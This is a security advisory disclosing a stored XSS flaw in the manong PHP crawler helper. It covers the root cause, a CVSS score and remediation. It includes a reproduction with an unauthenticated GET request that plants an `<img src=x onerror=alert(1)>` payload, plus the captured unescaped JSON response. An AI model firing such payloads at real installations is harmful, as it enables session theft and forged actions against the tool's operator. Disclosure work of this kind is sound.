# manong Stored Cross-Site Scripting

**CWE-79 · Stored XSS · Unauthenticated planting, operator-side DOM injection via jQuery `.before()`**

> **Vendor:** nemoTyrant
> **Product:** manong (PHP/MySQL crawler helper for the Manong Weekly archive)
> **Affected version:** master branch, latest as of 2026-09-27 (commit 7c9e522); no official release version
> **Affected endpoints:** plant: `GET /index.php?a=add` (GET `newcate`) · sink: `GET /index.php?a=cate` JSON → `manong.php:67` `$('.add').before(data.html)`
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Sensitive extracted values (credentials) have been redacted from this public disclosure.

## 1. Summary

The `a=add` endpoint stores the `newcate` GET parameter in `issue.category` with only `trim()`/`mb_strtoupper()` — no HTML encoding on the write side. When the tool's operator submits a crawl, the frontend fetches `a=cate`, whose handler builds `<option>` markup by raw concatenation (`func.php:116`, no `htmlspecialchars` on the read side either) and the frontend injects the JSON `html` field into the DOM with jQuery `$('.add').before(data.html)` (`manong.php:67`). The string is parsed into live DOM nodes, so a stored `<img src=x onerror=...>` payload executes in the operator's browser. Planting is unauthenticated.

## 2. Root Cause

| File | Lines | Role |
|---|---|---|
| `func.php` | 126-141 | `add()` — `newcate` stored with `trim()` + `mb_strtoupper()` only, no encoding (write side) |
| `func.php` | 108-121 | `cate()` — `'<option value="' . $val . '">' . $val . '</option>'` raw concatenation (read side) |
| `manong.php` | 61-70 | crawl submit → `$.getJSON('index.php?a=cate')` → `$(this).before(data.html)` — HTML-string parse into live DOM |

```php
// func.php:116 (cate) — no htmlspecialchars, attribute value AND inner text unescaped
$html .= '<option value="' . $val . '">' . $val . '</option>';
```

```js
// manong.php:67 — jQuery .before() parses the server string into live DOM nodes
$('.add').each(function(i){
    $(this).before(data.html);
});
```

Both sides are unencoded: the write side stores attacker HTML verbatim (uppercased by `mb_strtoupper`, which is irrelevant to HTML parsing) and the read side concatenates it into markup that is inserted as HTML (not text) by jQuery.

## 3. Prerequisites

- **Planting:** none — `a=add` is unauthenticated, one GET request stores the payload.
- **Execution:** the victim (the tool's operator — a single-admin tool) must open the page and submit a crawl, which triggers the `a=cate` fetch and DOM insertion.

## 4. Reproduction

Plant (unauthenticated):

```http
GET /index.php?a=add&title=t&desc=d&href=h&number=1&newcate=<img src=x onerror=alert(1)> HTTP/1.1
```

Response: `{"res":1,"msg":"success","cate":"<IMG SRC=X ONERROR=ALERT(1)>"}` — stored in `issue.category` (verified in the DB).

Sink — victim's browser after submitting a crawl fetches:

```http
GET /index.php?a=cate HTTP/1.1
```

Response (`application/json`), payload unescaped in BOTH positions of the option:

```json
{"html":"<select name=\"category\"><option value=\"0\">请选择</option><option value=\"<IMG SRC=X ONERROR=ALERT(1)>\"><IMG SRC=X ONERROR=ALERT(1)></option><option value=\"C\">C</option>...</select>","cate":[...]}
```

`$('.add').before(data.html)` parses the string: the inner-text instance becomes a real `<img src=x>` element whose failed load fires `onerror`. Uppercase tags are valid HTML.

## 5. Confirmed Techniques

- Planted value stored verbatim (uppercased) in `issue.category` — verified directly in the database.
- `a=cate` JSON captured showing the payload unescaped in both the attribute value and the inner text.
- Sink code path verified exactly: jQuery `.before()` with an HTML string parses it into DOM nodes (jQuery semantics; `data.html` is inserted as markup, not text). No headless browser dialog was captured in the lab, so execution is established by the exact verified code path rather than a screenshot — the stored value, unescaped output, and DOM-insertion call were each verified directly.

## 6. Impact

Persistent JavaScript execution in the operator's browser session when they use the tool normally: session/cookie theft (cookies of the tool's session are reachable from the injected script), forged tool actions, and redirection. Because planting is unauthenticated and the operator is a single admin, an attacker can seed the payload and wait.

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` (Base 6.1 Medium)

## 8. Remediation

- Apply `htmlspecialchars($val, ENT_QUOTES, 'UTF-8')` to every DB-derived value before building HTML in `cate()` (and the equivalent echoes in `crawl()`).
- Validate `newcate` against a strict character whitelist on write (or store the raw category and encode only at render time).
- Insert server data as text (e.g. build options via `$(document.createElement('option')).text(...)`) instead of injecting HTML strings with `.before()`.

## 9. References

- Project: https://github.com/nemoTyrant/manong
- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- External disclosure: https://gist.github.com/qianqiusujiu/b1ad44df87fe8a26285587d1309c61b8
- VulDB submission #xxxxxx
- Companion disclosure: unauthenticated SQL injection in the same application (same endpoints feed the same tables)

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
